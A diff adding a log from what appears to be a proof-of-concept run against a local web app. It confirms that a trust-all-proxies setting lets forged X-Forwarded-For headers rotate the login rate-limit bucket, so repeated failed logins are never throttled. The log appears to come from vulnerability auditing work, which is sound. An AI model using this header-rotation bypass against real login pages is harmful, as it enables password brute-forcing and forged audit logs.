@@ -1,0 +1,30 @@
+========================================================================
+VULN-008: trustProxies('*') -> client-controlled request()->ip()
+target: http://localhost:20000
+[INFO] exercising vulnerable code path: Login::authenticate rateLimit(5) keyed on request()->ip() (== X-Forwarded-For)
+========================================================================
+[STEP] Phase A: 8 failed logins, all with a FIXED X-Forwarded-For 203.0.113.165
+[INFO]   attempt 1: CREDS
+[INFO]   attempt 2: CREDS
+[INFO]   attempt 3: CREDS
+[INFO]   attempt 4: CREDS
+[INFO]   attempt 5: CREDS
+[INFO]   attempt 6: THROTTLED
+[INFO]   attempt 7: THROTTLED
+[INFO]   attempt 8: THROTTLED
+[INFO] Phase A: 3/8 throttled (throttle engaged after the 5-attempt limit)
+[STEP] Phase B: 8 failed logins, each with a DIFFERENT X-Forwarded-For
+[INFO]   attempt 1 (XFF 10.181.128.249): CREDS
+[INFO]   attempt 2 (XFF 10.246.24.74): CREDS
+[INFO]   attempt 3 (XFF 10.249.43.79): CREDS
+[INFO]   attempt 4 (XFF 10.203.236.17): CREDS
+[INFO]   attempt 5 (XFF 10.214.252.145): CREDS
+[INFO]   attempt 6 (XFF 10.106.127.222): CREDS
+[INFO]   attempt 7 (XFF 10.141.138.72): CREDS
+[INFO]   attempt 8 (XFF 10.83.5.62): CREDS
+[INFO] Phase B: 0/8 throttled
+[STEP] corroborating that request()->ip() == the spoofed header under the app's trust config
+[INFO] tinker (replicating trustProxies('*')): resolved_ip=203.0.113.77
+[PROOF] Fixed IP -> throttle engaged (3 blocked). Rotating IP -> NEVER throttled (0 blocked) despite identical failed-login volume. request()->ip() resolves to the spoofed header (resolved_ip=203.0.113.77).
+[OK] exploit confirmed — IP-keyed rate limiting bypassed; source IP is attacker-forgeable
+==> VULN-008: CONFIRMED — client-controlled X-Forwarded-For rotates the rate-limit bucket and forges the logged IP
